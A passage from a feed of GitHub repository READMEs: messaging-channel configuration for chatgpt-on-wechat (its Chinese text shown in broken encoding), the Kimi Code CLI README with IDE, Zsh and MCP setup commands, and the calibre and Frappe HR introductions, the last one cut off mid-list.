&lt;p&gt;‰ª•‰∏ãÂØπÂèØÊé•ÂÖ•ÈÄöÈÅìÁöÑÈÖçÁΩÆÊñπÂºèËøõË°åËØ¥ÊòéÔºåÂ∫îÁî®ÈÄöÈÅì‰ª£Á†ÅÂú®È°πÁõÆÁöÑ &lt;code&gt;channel/&lt;/code&gt; ÁõÆÂΩï‰∏ã„ÄÇ&lt;/p&gt; 
&lt;details&gt; 
 &lt;summary&gt;1. Web&lt;/summary&gt; 
 &lt;p&gt;È°πÁõÆÂêØÂä®ÂêéÈªòËÆ§ËøêË°åWebÈÄöÈÅìÔºåÈÖçÁΩÆÂ¶Ç‰∏ãÔºö&lt;/p&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
    "channel_type": "web",
    "web_port": 9899
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;web_port&lt;/code&gt;: ÈªòËÆ§‰∏∫ 9899ÔºåÂèØÊåâÈúÄÊõ¥ÊîπÔºåÈúÄË¶ÅÊúçÂä°Âô®Èò≤ÁÅ´Â¢ôÂíåÂÆâÂÖ®ÁªÑÊîæË°åËØ•Á´ØÂè£&lt;/li&gt; 
  &lt;li&gt;Â¶ÇÊú¨Âú∞ËøêË°åÔºåÂêØÂä®ÂêéËØ∑ËÆøÈóÆ &lt;code&gt;http://localhost:9899/chat&lt;/code&gt; ÔºõÂ¶ÇÊúçÂä°Âô®ËøêË°åÔºåËØ∑ËÆøÈóÆ &lt;code&gt;http://ip:9899/chat&lt;/code&gt;&lt;/li&gt; 
 &lt;/ul&gt; 
 &lt;blockquote&gt; 
  &lt;p&gt;Ê≥®ÔºöËØ∑Â∞Ü‰∏äËø∞ url ‰∏≠ÁöÑ ip ÊàñËÄÖ port ÊõøÊç¢‰∏∫ÂÆûÈôÖÁöÑÂÄº&lt;/p&gt; 
 &lt;/blockquote&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;2. Feishu - È£û‰π¶&lt;/summary&gt; 
 &lt;p&gt;È£û‰π¶ÊîØÊåÅ‰∏§Áßç‰∫ã‰ª∂Êé•Êî∂Ê®°ÂºèÔºöWebSocket ÈïøËøûÊé•ÔºàÊé®ËçêÔºâÂíå Webhook„ÄÇ&lt;/p&gt; 
 &lt;p&gt;&lt;strong&gt;ÊñπÂºè‰∏ÄÔºöWebSocket Ê®°ÂºèÔºàÊé®ËçêÔºåÊó†ÈúÄÂÖ¨ÁΩë IPÔºâ&lt;/strong&gt;&lt;/p&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
    "channel_type": "feishu",
    "feishu_app_id": "APP_ID",
    "feishu_app_secret": "APP_SECRET",
    "feishu_event_mode": "websocket"
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;p&gt;&lt;strong&gt;ÊñπÂºè‰∫åÔºöWebhook Ê®°ÂºèÔºàÈúÄË¶ÅÂÖ¨ÁΩë IPÔºâ&lt;/strong&gt;&lt;/p&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
    "channel_type": "feishu",
    "feishu_app_id": "APP_ID",
    "feishu_app_secret": "APP_SECRET",
    "feishu_token": "VERIFICATION_TOKEN",
    "feishu_event_mode": "webhook",
    "feishu_port": 9891
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;feishu_event_mode&lt;/code&gt;: ‰∫ã‰ª∂Êé•Êî∂Ê®°ÂºèÔºå&lt;code&gt;websocket&lt;/code&gt;ÔºàÊé®ËçêÔºâÊàñ &lt;code&gt;webhook&lt;/code&gt;&lt;/li&gt; 
  &lt;li&gt;WebSocket Ê®°ÂºèÈúÄÂÆâË£Ö‰æùËµñÔºö&lt;code&gt;pip3 install lark-oapi&lt;/code&gt;&lt;/li&gt; 
 &lt;/ul&gt; 
 &lt;p&gt;ËØ¶ÁªÜÊ≠•È™§ÂíåÂèÇÊï∞ËØ¥ÊòéÂèÇËÄÉ &lt;a href="https://docs.link-ai.tech/cow/multi-platform/feishu"&gt;È£û‰π¶Êé•ÂÖ•&lt;/a&gt;&lt;/p&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;3. DingTalk - ÈíâÈíâ&lt;/summary&gt; 
 &lt;p&gt;ÈíâÈíâÈúÄË¶ÅÂú®ÂºÄÊîæÂπ≥Âè∞ÂàõÂª∫Êô∫ËÉΩÊú∫Âô®‰∫∫Â∫îÁî®ÔºåÂ∞Ü‰ª•‰∏ãÈÖçÁΩÆÂ°´ÂÖ• &lt;code&gt;config.json&lt;/code&gt;Ôºö&lt;/p&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
    "channel_type": "dingtalk",
    "dingtalk_client_id": "CLIENT_ID",
    "dingtalk_client_secret": "CLIENT_SECRET"
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;p&gt;ËØ¶ÁªÜÊ≠•È™§ÂíåÂèÇÊï∞ËØ¥ÊòéÂèÇËÄÉ &lt;a href="https://docs.link-ai.tech/cow/multi-platform/dingtalk"&gt;ÈíâÈíâÊé•ÂÖ•&lt;/a&gt;&lt;/p&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;4. WeCom App - ‰ºÅ‰∏öÂæÆ‰ø°Â∫îÁî®&lt;/summary&gt; 
 &lt;p&gt;‰ºÅ‰∏öÂæÆ‰ø°Ëá™Âª∫Â∫îÁî®Êé•ÂÖ•ÈúÄÂú®ÂêéÂè∞ÂàõÂª∫Â∫îÁî®Âπ∂ÂêØÁî®Ê∂àÊÅØÂõûË∞ÉÔºåÈÖçÁΩÆÁ§∫‰æãÔºö&lt;/p&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
    "channel_type": "wechatcom_app",
    "wechatcom_corp_id": "CORPID",
    "wechatcomapp_token": "TOKEN",
    "wechatcomapp_port": 9898,
    "wechatcomapp_secret": "SECRET",
    "wechatcomapp_agent_id": "AGENTID",
    "wechatcomapp_aes_key": "AESKEY"
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;p&gt;ËØ¶ÁªÜÊ≠•È™§ÂíåÂèÇÊï∞ËØ¥ÊòéÂèÇËÄÉ &lt;a href="https://docs.link-ai.tech/cow/multi-platform/wechat-com"&gt;‰ºÅÂæÆËá™Âª∫Â∫îÁî®Êé•ÂÖ•&lt;/a&gt;&lt;/p&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;5. WeChat MP - ÂæÆ‰ø°ÂÖ¨‰ºóÂè∑&lt;/summary&gt; 
 &lt;p&gt;Êú¨È°πÁõÆÊîØÊåÅËÆ¢ÈòÖÂè∑ÂíåÊúçÂä°Âè∑‰∏§ÁßçÂÖ¨‰ºóÂè∑ÔºåÈÄöËøáÊúçÂä°Âè∑Ôºà&lt;code&gt;wechatmp_service&lt;/code&gt;Ôºâ‰ΩìÈ™åÊõ¥‰Ω≥„ÄÇ&lt;/p&gt; 
 &lt;p&gt;&lt;strong&gt;‰∏™‰∫∫ËÆ¢ÈòÖÂè∑ÔºàwechatmpÔºâ&lt;/strong&gt;&lt;/p&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
    "channel_type": "wechatmp",
    "wechatmp_token": "TOKEN",
    "wechatmp_port": 80,
    "wechatmp_app_id": "APPID",
    "wechatmp_app_secret": "APPSECRET",
    "wechatmp_aes_key": ""
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;p&gt;&lt;strong&gt;‰ºÅ‰∏öÊúçÂä°Âè∑Ôºàwechatmp_serviceÔºâ&lt;/strong&gt;&lt;/p&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
    "channel_type": "wechatmp_service",
    "wechatmp_token": "TOKEN",
    "wechatmp_port": 80,
    "wechatmp_app_id": "APPID",
    "wechatmp_app_secret": "APPSECRET",
    "wechatmp_aes_key": ""
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;p&gt;ËØ¶ÁªÜÊ≠•È™§ÂíåÂèÇÊï∞ËØ¥ÊòéÂèÇËÄÉ &lt;a href="https://docs.link-ai.tech/cow/multi-platform/wechat-mp"&gt;ÂæÆ‰ø°ÂÖ¨‰ºóÂè∑Êé•ÂÖ•&lt;/a&gt;&lt;/p&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;6. Terminal - ÁªàÁ´Ø&lt;/summary&gt; 
 &lt;p&gt;‰øÆÊîπ &lt;code&gt;config.json&lt;/code&gt; ‰∏≠ÁöÑ &lt;code&gt;channel_type&lt;/code&gt; Â≠óÊÆµÔºö&lt;/p&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
    "channel_type": "terminal"
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;p&gt;ËøêË°åÂêéÂèØÂú®ÁªàÁ´Ø‰∏éÊú∫Âô®‰∫∫ËøõË°åÂØπËØù„ÄÇ&lt;/p&gt; 
&lt;/details&gt; 
&lt;br /&gt; 
&lt;h1&gt;üîó Áõ∏ÂÖ≥È°πÁõÆ&lt;/h1&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://github.com/zhayujie/bot-on-anything"&gt;bot-on-anything&lt;/a&gt;ÔºöËΩªÈáèÂíåÈ´òÂèØÊâ©Â±ïÁöÑÂ§ßÊ®°ÂûãÂ∫îÁî®Ê°ÜÊû∂ÔºåÊîØÊåÅÊé•ÂÖ•Slack, Telegram, Discord, GmailÁ≠âÊµ∑Â§ñÂπ≥Âè∞ÔºåÂèØ‰Ωú‰∏∫Êú¨È°πÁõÆÁöÑË°•ÂÖÖ‰ΩøÁî®„ÄÇ&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/MinimalFuture/AgentMesh"&gt;AgentMesh&lt;/a&gt;ÔºöÂºÄÊ∫êÁöÑÂ§öÊô∫ËÉΩ‰Ωì(Multi-Agent)Ê°ÜÊû∂ÔºåÂèØ‰ª•ÈÄöËøáÂ§öÊô∫ËÉΩ‰ΩìÂõ¢ÈòüÁöÑÂçèÂêåÊù•Ëß£ÂÜ≥Â§çÊùÇÈóÆÈ¢ò„ÄÇÊú¨È°πÁõÆÂü∫‰∫éËØ•Ê°ÜÊû∂ÂÆûÁé∞‰∫Ü&lt;a href="https://github.com/zhayujie/chatgpt-on-wechat/raw/master/plugins/agent/README.md"&gt;AgentÊèí‰ª∂&lt;/a&gt;ÔºåÂèØËÆøÈóÆÁªàÁ´Ø„ÄÅÊµèËßàÂô®„ÄÅÊñá‰ª∂Á≥ªÁªü„ÄÅÊêúÁ¥¢ÂºïÊìé Á≠âÂêÑÁ±ªÂ∑•ÂÖ∑ÔºåÂπ∂ÂÆûÁé∞‰∫ÜÂ§öÊô∫ËÉΩ‰ΩìÂçèÂêå„ÄÇ&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h1&gt;üîé Â∏∏ËßÅÈóÆÈ¢ò&lt;/h1&gt; 
&lt;p&gt;FAQsÔºö &lt;a href="https://github.com/zhayujie/chatgpt-on-wechat/wiki/FAQs"&gt;https://github.com/zhayujie/chatgpt-on-wechat/wiki/FAQs&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;ÊàñÁõ¥Êé•Âú®Á∫øÂí®ËØ¢ &lt;a href="https://link-ai.tech/app/Kv2fXJcH"&gt;È°πÁõÆÂ∞èÂä©Êâã&lt;/a&gt; (Áü•ËØÜÂ∫ìÊåÅÁª≠ÂÆåÂñÑ‰∏≠ÔºåÂõûÂ§ç‰æõÂèÇËÄÉ)&lt;/p&gt; 
&lt;h1&gt;üõ†Ô∏è ÂºÄÂèë&lt;/h1&gt; 
&lt;p&gt;Ê¨¢ËøéÊé•ÂÖ•Êõ¥Â§öÂ∫îÁî®ÈÄöÈÅìÔºåÂèÇËÄÉ &lt;a href="https://github.com/zhayujie/chatgpt-on-wechat/raw/master/channel/feishu/feishu_channel.py"&gt;È£û‰π¶ÈÄöÈÅì&lt;/a&gt; Êñ∞Â¢ûËá™ÂÆö‰πâÈÄöÈÅìÔºåÂÆûÁé∞Êé•Êî∂ÂíåÂèëÈÄÅÊ∂àÊÅØÈÄªËæëÂç≥ÂèØÂÆåÊàêÊé•ÂÖ•„ÄÇ ÂêåÊó∂Ê¨¢ËøéË¥°ÁåÆÊñ∞ÁöÑSkillsÔºåÂèÇËÄÉ &lt;a href="https://github.com/zhayujie/chatgpt-on-wechat/raw/master/skills/skill-creator/SKILL.md"&gt;SkillÂàõÈÄ†Âô®ËØ¥Êòé&lt;/a&gt;„ÄÇ&lt;/p&gt; 
&lt;h1&gt;‚úâ ËÅîÁ≥ª&lt;/h1&gt; 
&lt;p&gt;Ê¨¢ËøéÊèê‰∫§PR„ÄÅIssuesËøõË°åÂèçÈ¶àÔºå‰ª•ÂèäÈÄöËøá üåüStar ÊîØÊåÅÂπ∂ÂÖ≥Ê≥®È°πÁõÆÊõ¥Êñ∞„ÄÇÈ°πÁõÆËøêË°åÈÅáÂà∞ÈóÆÈ¢òÂèØ‰ª•Êü•Áúã &lt;a href="https://github.com/zhayujie/chatgpt-on-wechat/wiki/FAQs"&gt;Â∏∏ËßÅÈóÆÈ¢òÂàóË°®&lt;/a&gt; Ôºå‰ª•ÂèäÂâçÂæÄ &lt;a href="https://github.com/zhayujie/chatgpt-on-wechat/issues"&gt;Issues&lt;/a&gt; ‰∏≠ÊêúÁ¥¢„ÄÇ‰∏™‰∫∫ÂºÄÂèëËÄÖÂèØÂä†ÂÖ•ÂºÄÊ∫ê‰∫§ÊµÅÁæ§ÂèÇ‰∏éÊõ¥Â§öËÆ®ËÆ∫Ôºå‰ºÅ‰∏öÁî®Êà∑ÂèØËÅîÁ≥ª&lt;a href="https://cdn.link-ai.tech/portal/linkai-customer-service.png"&gt;‰∫ßÂìÅÂÆ¢Êúç&lt;/a&gt;Âí®ËØ¢„ÄÇ&lt;/p&gt; 
&lt;h1&gt;üåü Ë¥°ÁåÆËÄÖ&lt;/h1&gt; 
&lt;p&gt;&lt;img src="https://contrib.rocks/image?repo=zhayujie/chatgpt-on-wechat&amp;amp;max=1000" alt="cow contributors" /&gt;&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>MoonshotAI/kimi-cli</title>
      <link>https://github.com/MoonshotAI/kimi-cli</link>
      <description>&lt;p&gt;Kimi Code CLI is your next CLI agent.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Kimi Code CLI&lt;/h1&gt; 
&lt;p&gt;&lt;a href="https://github.com/MoonshotAI/kimi-cli/graphs/commit-activity"&gt;&lt;img src="https://img.shields.io/github/commit-activity/w/MoonshotAI/kimi-cli" alt="Commit Activity" /&gt;&lt;/a&gt; &lt;a href="https://github.com/MoonshotAI/kimi-cli/actions"&gt;&lt;img src="https://img.shields.io/github/check-runs/MoonshotAI/kimi-cli/main" alt="Checks" /&gt;&lt;/a&gt; &lt;a href="https://pypi.org/project/kimi-cli/"&gt;&lt;img src="https://img.shields.io/pypi/v/kimi-cli" alt="Version" /&gt;&lt;/a&gt; &lt;a href="https://pypistats.org/packages/kimi-cli"&gt;&lt;img src="https://img.shields.io/pypi/dw/kimi-cli" alt="Downloads" /&gt;&lt;/a&gt; &lt;a href="https://deepwiki.com/MoonshotAI/kimi-cli"&gt;&lt;img src="https://deepwiki.com/badge.svg?sanitize=true" alt="Ask DeepWiki" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;&lt;a href="https://www.kimi.com/code/"&gt;Kimi Code&lt;/a&gt; | &lt;a href="https://moonshotai.github.io/kimi-cli/en/"&gt;Documentation&lt;/a&gt; | &lt;a href="https://moonshotai.github.io/kimi-cli/zh/"&gt;ÊñáÊ°£&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Kimi Code CLI is an AI agent that runs in the terminal, helping you complete software development tasks and terminal operations. It can read and edit code, execute shell commands, search and fetch web pages, and autonomously plan and adjust actions during execution.&lt;/p&gt; 
&lt;h2&gt;Getting Started&lt;/h2&gt; 
&lt;p&gt;See &lt;a href="https://moonshotai.github.io/kimi-cli/en/guides/getting-started.html"&gt;Getting Started&lt;/a&gt; for how to install and start using Kimi Code CLI.&lt;/p&gt; 
&lt;h2&gt;Key Features&lt;/h2&gt; 
&lt;h3&gt;Shell command mode&lt;/h3&gt; 
&lt;p&gt;Kimi Code CLI is not only a coding agent, but also a shell. You can switch the shell command mode by pressing &lt;code&gt;Ctrl-X&lt;/code&gt;. In this mode, you can directly run shell commands without leaving Kimi Code CLI.&lt;/p&gt; 
&lt;p&gt;&lt;img src="https://raw.githubusercontent.com/MoonshotAI/kimi-cli/main/docs/media/shell-mode.gif" alt="" /&gt;&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;[!NOTE] Built-in shell commands like &lt;code&gt;cd&lt;/code&gt; are not supported yet.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h3&gt;VS Code extension&lt;/h3&gt; 
&lt;p&gt;Kimi Code CLI can be integrated with &lt;a href="https://code.visualstudio.com/"&gt;Visual Studio Code&lt;/a&gt; via the &lt;a href="https://marketplace.visualstudio.com/items?itemName=moonshot-ai.kimi-code"&gt;Kimi Code VS Code Extension&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;&lt;img src="https://raw.githubusercontent.com/MoonshotAI/kimi-cli/main/docs/media/vscode.png" alt="VS Code Extension" /&gt;&lt;/p&gt; 
&lt;h3&gt;IDE integration via ACP&lt;/h3&gt; 
&lt;p&gt;Kimi Code CLI supports &lt;a href="https://github.com/agentclientprotocol/agent-client-protocol"&gt;Agent Client Protocol&lt;/a&gt; out of the box. You can use it together with any ACP-compatible editor or IDE.&lt;/p&gt; 
&lt;p&gt;To use Kimi Code CLI with ACP clients, make sure to run Kimi Code CLI in the terminal and send &lt;code&gt;/login&lt;/code&gt; to complete the login first. Then, you can configure your ACP client to start Kimi Code CLI as an ACP agent server with command &lt;code&gt;kimi acp&lt;/code&gt;.&lt;/p&gt; 
&lt;p&gt;For example, to use Kimi Code CLI with &lt;a href="https://zed.dev/"&gt;Zed&lt;/a&gt; or &lt;a href="https://blog.jetbrains.com/ai/2025/12/bring-your-own-ai-agent-to-jetbrains-ides/"&gt;JetBrains&lt;/a&gt;, add the following configuration to your &lt;code&gt;~/.config/zed/settings.json&lt;/code&gt; or &lt;code&gt;~/.jetbrains/acp.json&lt;/code&gt; file:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-json"&gt;{
  "agent_servers": {
    "Kimi Code CLI": {
      "command": "kimi",
      "args": ["acp"],
      "env": {}
    }
  }
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Then you can create Kimi Code CLI threads in IDE's agent panel.&lt;/p&gt; 
&lt;p&gt;&lt;img src="https://raw.githubusercontent.com/MoonshotAI/kimi-cli/main/docs/media/acp-integration.gif" alt="" /&gt;&lt;/p&gt; 
&lt;h3&gt;Zsh integration&lt;/h3&gt; 
&lt;p&gt;You can use Kimi Code CLI together with Zsh, to empower your shell experience with AI agent capabilities.&lt;/p&gt; 
&lt;p&gt;Install the &lt;a href="https://github.com/MoonshotAI/zsh-kimi-cli"&gt;zsh-kimi-cli&lt;/a&gt; plugin via:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-sh"&gt;git clone https://github.com/MoonshotAI/zsh-kimi-cli.git \
  ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/kimi-cli
&lt;/code&gt;&lt;/pre&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;[!NOTE] If you are using a plugin manager other than Oh My Zsh, you may need to refer to the plugin's README for installation instructions.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;Then add &lt;code&gt;kimi-cli&lt;/code&gt; to your Zsh plugin list in &lt;code&gt;~/.zshrc&lt;/code&gt;:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-sh"&gt;plugins=(... kimi-cli)
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;After restarting Zsh, you can switch to agent mode by pressing &lt;code&gt;Ctrl-X&lt;/code&gt;.&lt;/p&gt; 
&lt;h3&gt;MCP support&lt;/h3&gt; 
&lt;p&gt;Kimi Code CLI supports MCP (Model Context Protocol) tools.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;&lt;code&gt;kimi mcp&lt;/code&gt; sub-command group&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;You can manage MCP servers with &lt;code&gt;kimi mcp&lt;/code&gt; sub-command group. For example:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-sh"&gt;# Add streamable HTTP server:
kimi mcp add --transport http context7 https://mcp.context7.com/mcp --header "CONTEXT7_API_KEY: ctx7sk-your-key"

# Add streamable HTTP server with OAuth authorization:
kimi mcp add --transport http --auth oauth linear https://mcp.linear.app/mcp

# Add stdio server:
kimi mcp add --transport stdio chrome-devtools -- npx chrome-devtools-mcp@latest

# List added MCP servers:
kimi mcp list

# Remove an MCP server:
kimi mcp remove chrome-devtools

# Authorize an MCP server:
kimi mcp auth linear
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Ad-hoc MCP configuration&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;Kimi Code CLI also supports ad-hoc MCP server configuration via CLI option.&lt;/p&gt; 
&lt;p&gt;Given an MCP config file in the well-known MCP config format like the following:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-json"&gt;{
  "mcpServers": {
    "context7": {
      "url": "https://mcp.context7.com/mcp",
      "headers": {
        "CONTEXT7_API_KEY": "YOUR_API_KEY"
      }
    },
    "chrome-devtools": {
      "command": "npx",
      "args": ["-y", "chrome-devtools-mcp@latest"]
    }
  }
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Run &lt;code&gt;kimi&lt;/code&gt; with &lt;code&gt;--mcp-config-file&lt;/code&gt; option to connect to the specified MCP servers:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-sh"&gt;kimi --mcp-config-file /path/to/mcp.json
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;More&lt;/h3&gt; 
&lt;p&gt;See more features in the &lt;a href="https://moonshotai.github.io/kimi-cli/en/"&gt;Documentation&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;Development&lt;/h2&gt; 
&lt;p&gt;To develop Kimi Code CLI, run:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-sh"&gt;git clone https://github.com/MoonshotAI/kimi-cli.git
cd kimi-cli

make prepare  # prepare the development environment
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Then you can start working on Kimi Code CLI.&lt;/p&gt; 
&lt;p&gt;Refer to the following commands after you make changes:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-sh"&gt;uv run kimi  # run Kimi Code CLI

make format  # format code
make check  # run linting and type checking
make test  # run tests
make test-kimi-cli  # run Kimi Code CLI tests only
make test-kosong  # run kosong tests only
make test-pykaos  # run pykaos tests only
make build-web  # build the web UI and sync it into the package (requires Node.js/npm)
make build  # build python packages
make build-bin  # build standalone binary
make help  # show all make targets
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Note: &lt;code&gt;make build&lt;/code&gt; and &lt;code&gt;make build-bin&lt;/code&gt; automatically run &lt;code&gt;make build-web&lt;/code&gt; to embed the web UI.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>kovidgoyal/calibre</title>
      <link>https://github.com/kovidgoyal/calibre</link>
      <description>&lt;p&gt;The official source code repository for the calibre ebook manager&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;calibre&lt;/h1&gt; 
&lt;img align="left" src="https://raw.githubusercontent.com/kovidgoyal/calibre/master/resources/images/lt.png" height="200" width="200" /&gt; 
&lt;p&gt;calibre is an e-book manager. It can view, convert, edit and catalog e-books in all of the major e-book formats. It can also talk to e-book reader devices. It can go out to the internet and fetch metadata for your books. It can download newspapers and convert them into e-books for convenient reading. It is cross platform, running on Linux, Windows and macOS.&lt;/p&gt; 
&lt;p&gt;For more information, see the &lt;a href="https://calibre-ebook.com/about"&gt;calibre About page&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;&lt;a href="https://github.com/kovidgoyal/calibre/actions?query=workflow%3ACI"&gt;&lt;img src="https://github.com/kovidgoyal/calibre/workflows/CI/badge.svg?sanitize=true" alt="Build Status" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;Screenshots&lt;/h2&gt; 
&lt;p&gt;&lt;a href="https://calibre-ebook.com/demo"&gt;Screenshots page&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;Usage&lt;/h2&gt; 
&lt;p&gt;See the &lt;a href="https://manual.calibre-ebook.com"&gt;User Manual&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;Development&lt;/h2&gt; 
&lt;p&gt;&lt;a href="https://manual.calibre-ebook.com/develop.html"&gt;Setting up a development environment for calibre&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;A &lt;a href="https://calibre-ebook.com/dist/src"&gt;tarball of the source code&lt;/a&gt; for the current calibre release.&lt;/p&gt; 
&lt;h2&gt;Bugs&lt;/h2&gt; 
&lt;p&gt;Bug reports and feature requests should be made in the calibre bug tracker at &lt;a href="https://bugs.launchpad.net/calibre"&gt;Launchpad&lt;/a&gt;. GitHub is only used for code hosting and pull requests.&lt;/p&gt; 
&lt;h2&gt;Support calibre&lt;/h2&gt; 
&lt;p&gt;calibre is a result of the efforts of many volunteers from all over the world. If you find it useful, please consider contributing to support its development. &lt;a href="https://calibre-ebook.com/donate"&gt;Donate to support calibre development&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;Building calibre binaries&lt;/h2&gt; 
&lt;p&gt;See &lt;a href="https://raw.githubusercontent.com/kovidgoyal/calibre/master/bypy/README.rst"&gt;Build instructions&lt;/a&gt; for instructions on how to build the calibre binaries and installers for all the platforms calibre supports.&lt;/p&gt; 
&lt;h2&gt;calibre package versions in various repositories&lt;/h2&gt; 
&lt;p&gt;&lt;a href="https://repology.org/project/calibre/versions"&gt;&lt;img src="https://repology.org/badge/vertical-allrepos/calibre.svg?columns=3&amp;amp;header=calibre" alt="Packaging Status" /&gt;&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>frappe/hrms</title>
      <link>https://github.com/frappe/hrms</link>
      <description>&lt;p&gt;Open Source HR and Payroll Software&lt;/p&gt;&lt;hr&gt;&lt;div align="center"&gt; 
 &lt;a href="https://frappe.io/hr"&gt; &lt;img src="https://raw.githubusercontent.com/frappe/hrms/develop/.github/frappe-hr-logo.png" height="80px" width="80px" alt="Frappe HR Logo" /&gt; &lt;/a&gt; 
 &lt;h2&gt;Frappe HR&lt;/h2&gt; 
 &lt;p align="center"&gt; &lt;/p&gt;
 &lt;p&gt;Open Source, modern, and easy-to-use HR and Payroll Software&lt;/p&gt; 
 &lt;p&gt;&lt;/p&gt; 
 &lt;p&gt;&lt;a href="https://github.com/frappe/hrms/actions/workflows/ci.yml"&gt;&lt;img src="https://github.com/frappe/hrms/actions/workflows/ci.yml/badge.svg?branch=develop" alt="CI" /&gt;&lt;/a&gt; &lt;a href="https://codecov.io/gh/frappe/hrms"&gt;&lt;img src="https://codecov.io/gh/frappe/hrms/branch/develop/graph/badge.svg?token=0TwvyUg3I5" alt="codecov" /&gt;&lt;/a&gt;&lt;/p&gt; 
 &lt;p&gt;&lt;a href="https://trendshift.io/repositories/10972" target="_blank"&gt;&lt;img src="https://trendshift.io/api/badge/repositories/10972" alt="frappe%2Fhrms | Trendshift" style="width: 250px; height: 55px;" width="250" height="55" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;/div&gt; 
&lt;div align="center"&gt; 
 &lt;img src="https://raw.githubusercontent.com/frappe/hrms/develop/.github/hrms-hero.png" /&gt; 
&lt;/div&gt; 
&lt;div align="center"&gt; 
 &lt;a href="https://frappe.io/hr"&gt;Website&lt;/a&gt; - 
 &lt;a href="https://docs.frappe.io/hr/introduction"&gt;Documentation&lt;/a&gt; 
&lt;/div&gt; 
&lt;h2&gt;Frappe HR&lt;/h2&gt; 
&lt;p&gt;Frappe HR has everything you need to drive excellence within the company. It's a complete HRMS solution with over 13 different modules right from Employee Management, Onboarding, Leaves, to Payroll, Taxation, and more!&lt;/p&gt; 
&lt;h2&gt;Motivation&lt;/h2&gt; 
&lt;p&gt;When Frappe team started growing in terms of size, we needed an open-source HR and Payroll software. We didn't find any "true" open-source HR software out there and so decided to build one ourselves. Initially, it was a set of modules within ERPNext but version 14 onwards, as the modules became more mature, Frappe HR was created as a separate product.&lt;/p&gt; 
&lt;h2&gt;Key Features&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Employee Lifecycle&lt;/strong&gt;: From onboarding employees, managing promotions and transfers, all the way to documenting feedback with exit interviews, make life easier for employees throughout their life cycle.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Leave and Attendance&lt;/strong&gt;: Configure leave policies, pull regional holidays with a click, check-in and check-out with geolocation capturing, track leave balances and attendance with reports.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Expense Claims and Advances&lt;/strong&gt;: Manage employee advances, claim expenses, configure multi-level approval workflows, all this with seamless integration with ERPNext accounting.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Performance Management&lt;/strong&gt;: Track goals, align goals with key result areas (KRAs), enable employees to evaluate themselves, make managing appraisal cycles easy.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Payroll &amp;amp; Taxation&lt;/strong&gt;: Create salary structures, configure income tax slabs, run standard payroll, accommodate additional salaries and off cycle payments, view income breakup on salary slips and so much more.&lt;/li&gt; 
